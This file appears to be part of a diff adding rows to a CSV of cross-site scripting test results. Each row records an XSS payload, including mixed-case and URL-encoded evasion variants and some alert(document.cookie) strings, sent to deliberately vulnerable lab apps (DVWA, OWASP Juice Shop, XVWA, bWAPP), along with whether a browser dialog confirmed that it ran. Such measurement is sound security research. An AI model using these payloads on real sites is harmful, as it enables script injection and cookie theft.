+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Evasion,3,%3Csvg%20onload=alert(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:48:27.437222+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Evasion,4,%3CScRiPt%3Econfirm(1)%3C/ScRiPt%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,188,,2026-10-19T02:48:27.615179+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Evasion,5,%3Cscript%3Eprompt(1)%3C/script%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:48:27.795704+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Evasion,6,%3Csvg%20onload=confirm(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,171,,2026-10-19T02:48:27.964281+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Evasion,7,%3Cimg%20src=x%20onerror=confirm(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:48:28.130080+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Evasion,8,%3Cbody%20onload=alert(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,157,,2026-10-19T02:48:28.288868+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Evasion,9,%3Ciframe%20src=javascript:alert(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,140,,2026-10-19T02:48:28.440380+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Evasion,10,%3Cscript%3Ealert(1)%3C/script%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:48:28.604570+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Evasion,11,%3Cscript%3Econfirm(1)%3C/script%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:48:28.779695+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Evasion,12,%3CScRiPt%3Ealert(1)%3C/ScRiPt%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:48:28.944366+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Evasion,13,%3CScRiPt%3Eprompt(1)%3C/ScRiPt%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:48:29.104373+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Evasion,14,%3CScRiPt%3Ealert(document.cookie)%3C/ScRiPt%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:48:29.269592+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Basic,1,<iframe src=javascript:alert(1)>,200,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,719,,2026-10-19T02:48:29.997212+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Basic,2,<script>confirm(1)</script>,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,93,,2026-10-19T02:48:30.095973+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Basic,3,<script>alert(1)</script>,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,125,,2026-10-19T02:48:30.208864+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Basic,4,<svg onload=confirm(1)>,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,110,,2026-10-19T02:48:30.318099+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Basic,5,<body onload=alert(1)>,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,94,,2026-10-19T02:48:30.418528+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Basic,6,<svg onload=alert(1)>,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,109,,2026-10-19T02:48:30.520842+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Basic,7,<img src=x onerror=confirm(1)>,0,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,109,,2026-10-19T02:48:30.634976+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Basic,8,%3CScRiPt%3Eprompt(1)%3C/ScRiPt%3E,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,94,,2026-10-19T02:48:30.733878+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Basic,9,<script>prompt(1)</script>,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,109,,2026-10-19T02:48:30.841809+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Basic,10,<img src=x onerror=alert(1)>,0,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,110,,2026-10-19T02:48:30.942047+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Basic,11,<script>alert(document.cookie)</script>,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,94,,2026-10-19T02:48:31.041831+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Basic,12,<ScRiPt>alert(1)</ScRiPt>,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,109,,2026-10-19T02:48:31.150486+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Basic,13,%3Csvg%20onload=confirm(1)%3E,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,109,,2026-10-19T02:48:31.266088+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Basic,14,%3Cscript%3Ealert(document.cookie)%3C/script%3E,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,125,,2026-10-19T02:48:31.380062+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Basic,15,%3Csvg%20onload=alert(1)%3E,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,94,,2026-10-19T02:48:31.477844+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Advanced,1,<img src=x onerror=alert(1)>,0,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,94,,2026-10-19T02:48:31.572630+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Advanced,2,<script>alert(1)</script>,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,109,,2026-10-19T02:48:31.682907+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Advanced,3,<script>alert(document.cookie)</script>,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,110,,2026-10-19T02:48:31.791315+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Advanced,4,<svg onload=alert(1)>,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,109,,2026-10-19T02:48:31.905397+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Advanced,5,<img src=x onerror=confirm(1)>,0,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,109,,2026-10-19T02:48:32.014734+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Advanced,6,%3Cimg%20src=x%20onerror=confirm(1)%3E,0,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,110,,2026-10-19T02:48:32.122627+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Advanced,7,<body onload=alert(1)>,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,109,,2026-10-19T02:48:32.223878+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Advanced,8,<ScRiPt>prompt(1)</ScRiPt>,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,94,,2026-10-19T02:48:32.323878+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Advanced,9,<ScRiPt>alert(1)</ScRiPt>,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,125,,2026-10-19T02:48:32.451968+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Advanced,10,<script>confirm(1)</script>,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,109,,2026-10-19T02:48:32.563945+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Advanced,11,<svg onload=confirm(1)>,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,110,,2026-10-19T02:48:32.663435+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Advanced,12,%3Ciframe%20src=javascript:alert(1)%3E,0,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,93,,2026-10-19T02:48:32.765928+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Advanced,13,%3CScRiPt%3Econfirm(1)%3C/ScRiPt%3E,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,125,,2026-10-19T02:48:32.888673+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Advanced,14,%3Csvg%20onload=confirm(1)%3E,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,94,,2026-10-19T02:48:32.988447+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Advanced,15,%3Cscript%3Ealert(document.cookie)%3C/script%3E,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,109,,2026-10-19T02:48:33.088548+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Advanced,16,%3CScRiPt%3Ealert(document.cookie)%3C/ScRiPt%3E,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,94,,2026-10-19T02:48:33.187994+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Advanced,17,<iframe src=javascript:alert(1)>,0,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,110,,2026-10-19T02:48:33.294145+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Advanced,18,<ScRiPt>confirm(1)</ScRiPt>,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,109,,2026-10-19T02:48:33.403085+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Advanced,19,<script>prompt(1)</script>,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,94,,2026-10-19T02:48:33.503780+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Advanced,20,<ScRiPt>alert(document.cookie)</ScRiPt>,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,94,,2026-10-19T02:48:33.611405+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Advanced,21,%3Cimg%20src=x%20onerror=alert(1)%3E,0,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,109,,2026-10-19T02:48:33.714543+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Advanced,22,%3Cscript%3Eprompt(1)%3C/script%3E,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,110,,2026-10-19T02:48:33.829201+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Evasion,1,%3Cimg%20src=x%20onerror=alert(1)%3E,0,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,109,,2026-10-19T02:48:33.934213+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Evasion,2,%3Cscript%3Ealert(document.cookie)%3C/script%3E,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,110,,2026-10-19T02:48:34.037746+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Evasion,3,%3Csvg%20onload=alert(1)%3E,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,93,,2026-10-19T02:48:34.142075+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Evasion,4,%3CScRiPt%3Econfirm(1)%3C/ScRiPt%3E,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,110,,2026-10-19T02:48:34.242767+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Evasion,5,%3Cscript%3Eprompt(1)%3C/script%3E,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,109,,2026-10-19T02:48:34.353322+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Evasion,6,%3Csvg%20onload=confirm(1)%3E,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,125,,2026-10-19T02:48:34.477302+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Evasion,7,%3Cimg%20src=x%20onerror=confirm(1)%3E,0,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,109,,2026-10-19T02:48:34.594045+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Evasion,8,%3Cbody%20onload=alert(1)%3E,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,110,,2026-10-19T02:48:34.703220+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Evasion,9,%3Ciframe%20src=javascript:alert(1)%3E,0,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,125,,2026-10-19T02:48:34.821674+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Evasion,10,%3Cscript%3Ealert(1)%3C/script%3E,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,109,,2026-10-19T02:48:34.935748+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Evasion,11,%3Cscript%3Econfirm(1)%3C/script%3E,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,110,,2026-10-19T02:48:35.041441+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Evasion,12,%3CScRiPt%3Ealert(1)%3C/ScRiPt%3E,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,109,,2026-10-19T02:48:35.152541+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Evasion,13,%3CScRiPt%3Eprompt(1)%3C/ScRiPt%3E,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,125,,2026-10-19T02:48:35.275892+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,XSS,Evasion,14,%3CScRiPt%3Ealert(document.cookie)%3C/ScRiPt%3E,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,94,,2026-10-19T02:48:35.376208+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Basic,1,<iframe src=javascript:alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,297,,2026-10-19T02:48:35.685764+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Basic,2,<script>confirm(1)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:48:35.846917+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Basic,3,<script>alert(1)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,188,,2026-10-19T02:48:36.032534+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Basic,4,<svg onload=confirm(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,187,,2026-10-19T02:48:36.215670+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Basic,5,<body onload=alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:48:36.380421+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Basic,6,<svg onload=alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,157,,2026-10-19T02:48:36.548393+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Basic,7,<img src=x onerror=confirm(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,187,,2026-10-19T02:48:36.723689+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Basic,8,%3CScRiPt%3Eprompt(1)%3C/ScRiPt%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:48:36.881382+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Basic,9,<script>prompt(1)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,157,,2026-10-19T02:48:37.039248+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Basic,10,<img src=x onerror=alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:48:37.206240+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Basic,11,<script>alert(document.cookie)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,187,,2026-10-19T02:48:37.387718+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Basic,12,<ScRiPt>alert(1)</ScRiPt>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:48:37.563316+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Basic,13,%3Csvg%20onload=confirm(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:48:37.721822+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Basic,14,%3Cscript%3Ealert(document.cookie)%3C/script%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:48:37.879833+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Basic,15,%3Csvg%20onload=alert(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:48:38.055561+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Advanced,1,<img src=x onerror=alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:48:38.230014+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Advanced,2,<script>alert(1)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:48:38.395699+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Advanced,3,<script>alert(document.cookie)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:48:38.560736+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Advanced,4,<svg onload=alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:48:38.727928+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Advanced,5,<img src=x onerror=confirm(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:48:38.887058+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Advanced,6,%3Cimg%20src=x%20onerror=confirm(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:48:39.052718+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Advanced,7,<body onload=alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:48:39.220439+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Advanced,8,<ScRiPt>prompt(1)</ScRiPt>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,188,,2026-10-19T02:48:39.402506+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Advanced,9,<ScRiPt>alert(1)</ScRiPt>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:48:39.576883+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Advanced,10,<script>confirm(1)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:48:39.727135+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Advanced,11,<svg onload=confirm(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:48:39.909725+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Advanced,12,%3Ciframe%20src=javascript:alert(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:48:40.059129+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Advanced,13,%3CScRiPt%3Econfirm(1)%3C/ScRiPt%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:48:40.217398+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Advanced,14,%3Csvg%20onload=confirm(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,157,,2026-10-19T02:48:40.376567+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Advanced,15,%3Cscript%3Ealert(document.cookie)%3C/script%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:48:40.531854+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Advanced,16,%3CScRiPt%3Ealert(document.cookie)%3C/ScRiPt%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:48:40.700219+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Advanced,17,<iframe src=javascript:alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:48:40.850066+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Advanced,18,<ScRiPt>confirm(1)</ScRiPt>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:48:41.016948+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Advanced,19,<script>prompt(1)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,188,,2026-10-19T02:48:41.199140+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Advanced,20,<ScRiPt>alert(document.cookie)</ScRiPt>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:48:41.363364+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Advanced,21,%3Cimg%20src=x%20onerror=alert(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,188,,2026-10-19T02:48:41.548959+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Advanced,22,%3Cscript%3Eprompt(1)%3C/script%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,171,,2026-10-19T02:48:41.716583+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Evasion,1,%3Cimg%20src=x%20onerror=alert(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,188,,2026-10-19T02:48:41.898264+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Evasion,2,%3Cscript%3Ealert(document.cookie)%3C/script%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:48:42.056526+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Evasion,3,%3Csvg%20onload=alert(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:48:42.230123+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Evasion,4,%3CScRiPt%3Econfirm(1)%3C/ScRiPt%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:48:42.396284+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Evasion,5,%3Cscript%3Eprompt(1)%3C/script%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:48:42.554886+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Evasion,6,%3Csvg%20onload=confirm(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:48:42.713158+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Evasion,7,%3Cimg%20src=x%20onerror=confirm(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:48:42.881108+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Evasion,8,%3Cbody%20onload=alert(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:48:43.064035+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Evasion,9,%3Ciframe%20src=javascript:alert(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:48:43.228764+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Evasion,10,%3Cscript%3Ealert(1)%3C/script%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,188,,2026-10-19T02:48:43.411957+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Evasion,11,%3Cscript%3Econfirm(1)%3C/script%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,140,,2026-10-19T02:48:43.561082+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Evasion,12,%3CScRiPt%3Ealert(1)%3C/ScRiPt%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:48:43.727384+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Evasion,13,%3CScRiPt%3Eprompt(1)%3C/ScRiPt%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:48:43.886447+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,XSS,Evasion,14,%3CScRiPt%3Ealert(document.cookie)%3C/ScRiPt%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:48:44.058235+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Basic,1,<iframe src=javascript:alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,328,,2026-10-19T02:48:44.383659+00:00
